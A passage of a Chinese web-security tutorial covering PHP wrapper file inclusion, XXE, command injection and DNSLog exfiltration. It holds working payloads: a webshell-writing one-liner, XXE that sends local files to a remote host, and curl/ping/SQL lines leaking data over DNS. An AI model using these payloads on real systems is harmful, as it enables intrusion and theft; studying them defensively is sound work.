输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时
文件流以及可以操作其他读取写入文件资源的过滤器。

php://filter（本地磁盘文件进行读取）

元封装器，设计用于"数据流打开"时的"筛选过滤"应用，对本地磁盘文件进行读写,不受allow_url_fopen与allow_url_include的影响

php.ini

allow_url_fopen ：off/on
allow_url_include：off/on

Usage:
```
?filename=php://filter/read=convert.base64-encode/resource=phpinfo.php
与
?filename=php://filter/convert.base64-encode/resource=phpinfo.php 一样。
```
![php_protocol_php1](Web/php_protocol_php1.png)

php://input（写shell）

可以访问请求的原始数据的只读流。
将POST请求中的数据作为PHP代码执行。
enctype="multipart/form-data" 的时候 php://input 是无效的。

PHP.ini：

allow_url_fopen ：off/on
allow_url_include：on

Usage:
```
<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>
```
![php_protocol_php2](Web/php_protocol_php2.png)

php://input（命令执行）

![php_protocol_php3](Web/php_protocol_php3.png)

#### data://伪协议

php.ini

allow_url_fopen ：on（官网是说不受allow_url_fopen影响，经过测试这个要为On，才能造成任意代码执行）
allow_url_include：on

条件:  PHP 5.2.0 起 data://数据流封装器开始有效。

用法：data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== 

or

	http://127.0.0.1/fileinclude.php?filename=data:text/plain,<?php phpinfo();?>

![php_protocol_php6](Web/php_protocol_php6.png)

#### phar://伪协议

php.ini

allow_url_fopen ：off/on
allow_url_include：off/on

用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： phar:// 数据流包装器自 PHP 5.3.0 起开始有效， 压缩包需要是zip协议压缩，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 

![php_protocol5](Web/php_protocol5.png)

#### zip://伪协议

php.ini

allow_url_fopen ：off/on
allow_url_include：off/on

用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.txt。

xxx.png 不管后缀是什么，都会当做zip压缩包来解压。

shell.txt 不管后缀是什么，只要里面有php代码，被include等包含函数包含，都会被执行。

条件：#在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。

![php_protocol_php4](Web/php_protocol_php4.png)

#### 总结

PHP中 allow_url_fopen默认为On，allow_url_include默认为Off

|协议|条件|allow_url_fopen|allow_url_include|
|-|-|-|-|
|file://|PHP>=5.0.0|off/on|off/on|
|php://filter|PHP>=5.0.0|off/on|off/on|
|php://input|\|off/on|on|
|zip://|\|off/on|off/on|
|data://|PHP>=5.2.0|on|on|
|phar://|PHP>=5.3.0|off/on|off/on|

### 修复建议
参考DVWA。


## XML外部实体攻击（XML External Entity attack）

**0x00 简介**

XML（eXtensible Markup Language）是一种标记语言，被设计用来传输和存储数据。

在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

包含内部实体的XML文档：
``` xml
// XML声明
<?xml version="1.0" encoding="utf-8"?>

// 文档类型定义
<!DOCTYPE entity [
  <!ENTITY copyright "Copyright www.lxhsec.com">
]>

// 文档元素
<lxhsec>
  <internal>&copyright;</internal>  
</lxhsec>
```

包含外部实体的XML文档：
``` xml
<?xml version="1.0" encoding="utf-8"?>
 
<!DOCTYPE entity [
  <!ENTITY blog SYSTEM "http://www.lxhsec.com/">
]>
 
<lxhsec>
  <external>&blog;</external>
</lxhsec>
```
在解析XML时，实体将会被替换成相应的引用内容。

XML外部实体（XML External Entity，XXE）攻击是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。


**0x01 成因**
若WEB应用程序使用了XML进行数据传输，支持解析外部实体，且XML数据可控，则会导致XXE产生。

**0x02 利用**

这里以PHP为例，讲解XXE漏洞。

在开始之前，我们要了解XML中拥有特殊意义的字符。

|HTML实体|字符|说明|
|-|-|-|
|& lt;|<|小于|
|& gt;|>|大于|
|& amp;|&|AND|
|& apos;|'|单引号|
|& quot;|"|双引号|

在 XML 中，只有字符 "<" 和 "&" 是非法的,也就是说如果我们解析的文件中含有< or & ，将导致XML解析出错，例，使用file协议读取文件时，若读取的文件中包含看< or & 将报错。

file协议 - 读取文件

测试代码：
``` PHP
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
  <!ENTITY lxhsec SYSTEM "file:///c:/windows/win.ini">
]>
<lxhsec>&lxhsec;</lxhsec>
EOF;

$data = simplexml_load_string($xml);
print_r($data);
?>
```

结果：
![xxe1](Web/xxe1.png)

注：如果读取的文件本身包含“<”、“&”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：
``` PHP
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
	<!ENTITY lxhsec SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini">
]>
<lxhsec>&lxhsec;</lxhsec>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```
结果：
![xxe4](Web/xxe4.png)

ps: php://filter 读取文件，支持相对路径。


HTTP(s)协议 - 探测内网端口

测试代码：
``` PHP
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
  <!ENTITY lxhsec SYSTEM "http://192.168.31.132:80/xxxx">
]>
<lxhsec>&lxhsec;</lxhsec>
EOF;

$data = simplexml_load_string($xml);
print_r($data);
?>
```
结果：

端口开放
![xxe2](Web/xxe2.png)

端口关闭
![xxe3](Web/xxe3.png)

通过返回不同的状态信息来判断端口开放情况，另外http(s)协议可以用来发起GET请求，攻击内网WEB应用程序，例如struts2.

上述代码，都是基于回显的利用，如果屏蔽了回显是不是就不能利用了呢?

当然不是，可以把数据发送到远程服务器。

测试代码:
``` PHP
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
	<!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini">
	<!ENTITY % remote SYSTEM "http://192.168.31.232/evil.txt">
%remote;
%send;
]>
EOF;
libxml_disable_entity_loader(false);
$data = simplexml_load_string($xml);
#print_r($data);
?>
```

实体remote，send的引用顺序很重要,首先对remote引用的目的是将外部文件evil.txt引入到解释上下文中，然后执行%all,这时会检测到send实体,之后执行%send,请求远程1.php文件，将内容传递过去。


远程evil.txt文件内容如下：
``` xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.31.232/1.php?file=%file;'>">
%all;
```

这里要注意 % send 中的%号要使用HTML实体编码，否则将报错。
![xxeremote1](Web/xxeremote1.png)

当然如果想去掉%号，不想用参数实体,可以直接在xml中多增加一行文档元素，用来解析实体,具体如下：
``` php
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
	<!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini">
	<!ENTITY % remote SYSTEM "http://192.168.31.232/evil.txt">
%remote;
]>
<root>&send;</root>
EOF;
libxml_disable_entity_loader(false);
$data = simplexml_load_string($xml);
#print_r($data);
?>

//evil.txt

<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.31.232/1.php?file=%file;'>">
%all;

```

远程1.php文件内容如下：
``` php
<?php
file_put_contents("1111.txt", $_GET['file']);
?>
```

触发XXE攻击后，服务器会把文件内容发送到攻击者网站,攻击者WEB应用程序再将文件内容保存在txt中。

![xxeremote4](Web/xxeremote4.png)

![xxeremote3](Web/xxeremote2.png)

![xxeremote3](Web/xxeremote3.png)

修复建议

1.在解析XML之前添加，禁用外部实体的方法。

PHP:
libxml_disable_entity_loader(true);

2.过滤XML数据

如，SYSTEM和PUBLIC


## 命令执行（OS Commanding）

0x01 前言
当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。 

0x02 成因
WEB应用程序在调用命令执行函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，又没有过滤用户的输入的情况下，就会造成命令执行漏洞。

0x03 利用
先来了解下几个特殊的符号。

Windows ：
|   - 前一个命令的输出，作为后一个命令的输入，显示后面的执行结果
![windows1](Web/windows1.png)

||  - 当前面为假时，才会执行后面的命令 
![windows2](Web/windows2.png)

&  - 无论前面结果如何，都会执行后面的命令
![windows3](Web/windows3.png)

&& - 当前面为真时，才会执行后面的命令。
![windows4](Web/windows4.png)

Linux:
; - 顺序执行，从左到右
![linux1](Web/linux1.png)

| - 前一个命令的输出，作为后一个命令的输入，显示后面的执行结果
![linux2](Web/linux2.png)


|| - 当前面为假时，才会执行后面的命令 
![linux3](Web/linux3.png)

&  - 无论前面结果如何，都会执行后面的命令
![linux4](Web/linux4.png)

&& - 当前面为真时，才会执行后面的命令。
![linux5](Web/linux5.png)

小结：Linux与Windows用法基本一致，Linux多了一个分号符号。


这里以PHP介绍命令执行漏洞。

测试代码：
```
<?php  
	$target = $_GET[ 'cmd' ];
	$cmd = shell_exec( 'ping  ' . $target );
	echo  '<pre>'.$cmd.'</pre>';
?> 
```

测试结果：
![oscommand](Web/oscommand.png)

分析
在测试代码中，原意是想测试网络的情况，但是因为参数可控，且我们没有过滤用户的输入，因此在测试结果中我们可以看到成功执行了whoami命令，导致了命令执行漏洞的产生。

在PHP中常见可控位置情况有下面几种：
```
system("$arg"); //可控点直接是待执行的程序
system("/bin/prog $arg"); //可控点是传入程序的整个参数
system("/bin/prog -p $arg"); //可控点是传入程序的某个参数的值（无引号包裹）
system("/bin/prog --p=\"$arg\""); //可控点是传入程序的某个参数的值（有双引号包裹）
system("/bin/prog --p='$arg'"); //可控点是传入程序的某个参数的值（有单引号包裹）
```

**第一种情况**
如果我们能直接控制$arg，那么就能执行执行任意命令了，没太多好说的。
**第二种情况**
我们能够控制的点是程序的整个参数，我们可以直接用&&或|等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。
还有一个偏门情况，当$arg被escapeshellcmd处理之后，我们不能越出这个外部程序的范围，我们可以看看这个程序自身是否有"执行外部命令"的参数或功能，比如linux下的sendmail命令自带读写文件功能，我们可以用来写webshell。
**第三种情况**
我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。
**第四种情况**
这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell环境下双引号中间的变量也是可以被解析的。我们可以在双引号内利用反引号执行任意命令. 
**第五种情况**
这是最难受的一种情况了，因为单引号内只是一个字符串，我们要先闭合单引号才可以执行命令。如：system("/bin/prog –p='aaa' | id''")

危害自然不言而喻，执行命令可以读写文件、反弹shell、获得系统权限、内网渗透等。


在PHP中可以调用外部程序的主要有以下函数：
```
system
exec
shell_exec = ``(反单引号)
passthru
popen
proc_popen
```

system 

说明：
```
string system ( string $command [, int $return_var ] )

command 要执行的命令。
return_var 命令执行成功，返回0，失败返回1.（可选参数）

返回值：
成功则返回命令输出的最后一行， 失败则返回 FALSE
```

测试代码：
```
//ip.php
<?php
    $target=$_GET['cmd'];
    $return = system($target);
	echo "<pre>system return value is: $return </pre>";
?>
```

结果：
http://127.0.0.1/ip.php?cmd=type ip.php
```
<?php
    $target=$_GET['cmd'];
    $return = system($target);
	echo "<pre>system return value is: $return </pre>";
?><pre>system return value is: ?> </pre>
```

exec

说明
```
string exec ( string $command [, array $output [, int $return_var ]] )

command 要执行的命令。

output 会使用返回结果填充output；如果output参数中已经有元素，exec()会在output后面追加。

return_var 如果同时提供 output 和 return_var 参数，命令执行后的返回状态会被写入到此变量。
命令执行成功，返回0，失败返回1.

返回值：
成功则返回命令输出的最后一行
```

测试代码：
```
<?php
	exec('whoami',$arr);
	var_dump($arr);
	echo "<br />";
	echo exec('netstat -ano | findstr 3306',$arr); // 返回命令输出的最后一行。
	echo "<br />";
	var_dump($arr);
?>
```

结果：
```
array(1) {
  [0]=>
  string(29) "lxhsec1-2688b1f\administrator"
}
<br />  TCP    127.0.0.1:3306         127.0.0.1:2143         ESTABLISHED     1020<br />array(4) {
  [0]=>
  string(29) "lxhsec1-2688b1f\administrator"
  [1]=>
  string(75) "  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1020"
  [2]=>
  string(75) "  TCP    127.0.0.1:2143         127.0.0.1:3306         ESTABLISHED     3852"
  [3]=>
  string(75) "  TCP    127.0.0.1:3306         127.0.0.1:2143         ESTABLISHED     1020"
}
```

shell_exec

说明
```
string shell_exec ( string $cmd )

cmd 要执行的命令。

返回值
命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。

Note: PHP 支持一个执行运算符：反引号（``）,
PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回.
使用反引号运算符"`"的效果与函数 shell_exec() 相同
```

测试代码：
```
<?php
	echo shell_exec("whoami");
?>
```

结果：
```
lxhsec1-2688b1f\administrator 
```

passthru

说明
```
void passthru ( string $command [, int $return_var ] )

command 要执行的命令。

return_var 命令执行成功，返回0，失败返回1.（可选参数）

没有返回值。
```

测试代码：
```
<?php
	passthru("whoami",$return);
	echo $return;
?>
```

结果：
```
lxhsec1-2688b1f\administrator
0
```

popen

说明
```
resource popen ( string $command , string $mode )

command 要执行的命令。
mode 模式，
r: 只读，返回的文件指针等于命令的STDOUT(命令的输出)
w: 只写（打开并清空已有文件或创建一个新文件），返回的文件指针等于命令的STDIN

返回值
返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向
的（只能用于读或写）并且必须用 pclose() 来关闭。
此指针可以用于 fgets()，fgetss() 和 fwrite()。

如果出错返回 FALSE。
```

测试代码：
```
<?php  
	$target = $_GET[ 'cmd' ];
	popen( 'ping  ' . $target, "r" );
?>  
```

测试结果:
http://127.0.0.1/ip.php?cmd=127.0.0.1 %26 whoami > 222.txt
```
会在ip.php同目录下生成一个222.txt文件，里面记录了whoami的内容
```


如果想将结果输出到页面上，可以使用下面测试代码

测试代码：
```
<?php  
$cmd = "whoami";  
$fp = popen($cmd,"r");  //popen打一个进程通道  
  
while (!feof($fp)) {      //从通道里面取得东西  
	$out = fgets($fp, 1024);  
	echo  $out;         //打印出来  
}  
pclose($fp);  
?>  
```

结果：
```
lxhsec1-2688b1f\administrator
```

proc_popen

说明
```
resource proc_open ( string $cmd , array 
$descriptorspec , array $pipes [, string $cwd [,
array $env [, array $other_options ]]] )

cmd 要执行的命令。

descriptorspec  一个索引数组。 
数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 
0 表示标准输入（stdin），
1 表示标准输出（stdout），
2 表示标准错误（stderr）。

数组值中第一个参数为描述符类型，有效的类型有：pipe 以及file。

pipes
将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。

cwd 
要执行命令的初始工作目录。 必须是绝对路径，为 NULL 时，代表当前 PHP 进程的工作目录。

env
要执行的命令所使用的环境变量，为 NULL 时，代表与php进程环境变量相同

other_options
可能的选项包括：
suppress_errors （仅用于 Windows 平台）： 设置为 TRUE 表示抑制本函数产生的错误。
bypass_shell （仅用于 Windows 平台）： 设置为 TRUE 表示绕过 cmd.exe shell。

返回值
返回表示进程的资源类型，并且必须用 proc_close() 来关闭，如果失败，返回 FALSE。
```

测试代码:
```
<?php  
	$target = $_GET[ 'cmd' ];
	$descriptorspec = array(
		0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
	);
	proc_open(  'ping  ' . $target, $descriptorspec,$pipes);
?>  

```

测试结果:
http://127.0.0.1/ip.php?cmd=127.0.0.1 %26 whoami > 122222.txt
```
在上述测试代码中，因为明确指明它的工作目录，因此会在php默认的工作目录中产生122222.txt，
由于环境是phpStudy搭建的，因此默认工作目录是C:\Program Files\phpStudy。
```

如果想将结果输出到页面上，可以使用下面测试代码

测试代码：
```
<?php  
$cmd = "whoami";  
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("file", "./error-output.txt", "a") // 标准错误，写入到一个文件
);
 
$fp = proc_open($cmd,$descriptorspec,$pipes);   //打开一个进程通道  

echo stream_get_contents($pipes[1]); 
proc_close($fp);  
?>  
```

结果：
```
lxhsec1-2688b1f\administrator
```

总结

|函数|描述|
|-|-|
|system|输出并返回最后一行shell结果|
|exec|不输出结果，返回最后一行shell结果，所有结果保存到一个返回的数组里面|
|shell_exec|将命令结果直接输出|
|passthru|将命令结果直接输出|
|popen，proc_open|不会直接返回执行结果，而是返回一个文件指针，返回什么不是关键，重要的是命令已经执行了|


## DNSLog

### 0x01 作用
某些漏洞直接利用无法得到回显的情况下，但是目标可以发起DNS请求，这时候可以通过DNSlog将想要获取的数据外带出来。

### 0x02 原理

DNS解析的基本原理：
![DNS](Web/dns.jpeg)

以mysql为例，讲解DNSlog基本原理。

在mysql中 load_file可用于发起DNS请求。

测试payload
```
select load_file(concat('\\\\',(select user()),'.t00ls.org\\abc'));
```
结果如下：

![mysqldnslog](Web/mysqldnslog.png)

Dnslog攻击的基本原理如下

![mysqldnslog](Web/mysqldnslog1.jpg)

总结来说，当你查询root@localhost.t00ls.org这个子域名时，dns服务器t00ls.org会收到你的解析请求，随后将你外带的值解析出来。

但是由于域名有一定的规范，一些特殊符号'@','*'等不能作为域名，因此外带的数据最好进行加密处理，否则将导致数据传输失败，如下：

测试payload
```
select load_file(concat('\\\\',(select hex(user())),'.t00ls.org\\abc'));
```

结果如下：
![mysqldnslog2](Web/mysqldnslog2.png)

另外，payload中带上`\\abc`，是因为要满足UNC语法。用2个`\\`是因为转义，本质是:`\`
UNC路径规定语法：`\\servername\sharename`
其中servername是服务器名。
sharename是共享资源的名称，也就是abc，
你要访问共享资源就必须跟资源名称。
满足语法要求后系统才会发起DNS请求，抓包就可以看见。

Note:
```
因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系
统中的时候，是不能使用这种方式外带数据的 
```

注意，域名前缀长度限制在63个，如果获取的数据超长，可用mid等截取函数进行分段读取，例如：
```
mid(user(),1,4) 截取 user 1,4范围

http://127.0.0.1/sqli.php?id=1' union select 1,load_file(concat('\\\\',(select hex(mid(user(),1,4))),'.t00ls.8c461ff41380308eba69317397ff7cdd.tu4.org\\abc')),3%23

mid(user(),5) 截取 4后面的所有

http://127.0.0.1/sqli.php?id=1' union select 1,load_file(concat('\\\\',(select hex(mid(user(),5))),'.t00ls.8c461ff41380308eba69317397ff7cdd.tu4.org\\abc')),3%23
```
![mysqldnslog3](Web/mysqldnslog3.png)


### 0x03利用

#### DNSLog In Mysql Injection  

首先查看变量确定权限。
show variables like '%secure%'

1、当secure_file_priv为空，可以读取写入文件任意目录。
2、当secure_file_priv为E:\，可以读取写入E盘。
3、当secure_file_priv为null，不允许读取写入文件。
在mysql 5.5.53版本之前默认为空可以加载文件 但是之后版本默认为NULL，会限制函数OUTFILE，LOAD_FILE，DUMP_FIlE等。

解决问题:
windows下：修改my.ini 在[mysqld]内加入secure_file_priv =

linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =

然后重启mysql。


union 
```
http://127.0.0.1/sqli.php?id=1' union select 1,load_file(concat('\\\\',(select hex(user())),'.t00ls.org\\abc')),3%23
```

blind
```
http://127.0.0.1/sqli_blind.php?id=1' and if((select load_file(concat('\\\\',(select hex(version())),'.t00ls.org\\abc'))),sleep(5),0)%23
```

#### DNSLog In OS Commanding

Windows:
`ping  %USERNAME%.t00ls.org`
结果:
![dnslogos0](Web/dnslogos0.png)

Linux:

curl：
```
curl http://`whoami`.t00ls.org/
```
结果：
![dnslogos1](Web/dnslogos1.png)

ping:
```
ping `whoami`.t00ls.org
```
结果：
![dnslogos2](Web/dnslogos2.png)

#### DNSLog In XXE

测试代码：
``` php
<?php
$xml = <<<EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
  <!ENTITY % lxhsec SYSTEM "http://666.t00ls.xxxxxxx.tu4.org">
%lxhsec;
]>
<lxhsec>root</lxhsec>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```
测试结果：
![dnslogxxe](Web/dnslogxxe.png)


### 总结
1.受操作系统限制，例如UNC在linux下没有。
2.受域名长度限制，必要的时候需要对查询结果做字符串切割。
3.受特殊符号限制，需要进行编码传输。
4.受语法限制，不同数据库之间拼接方式不同。





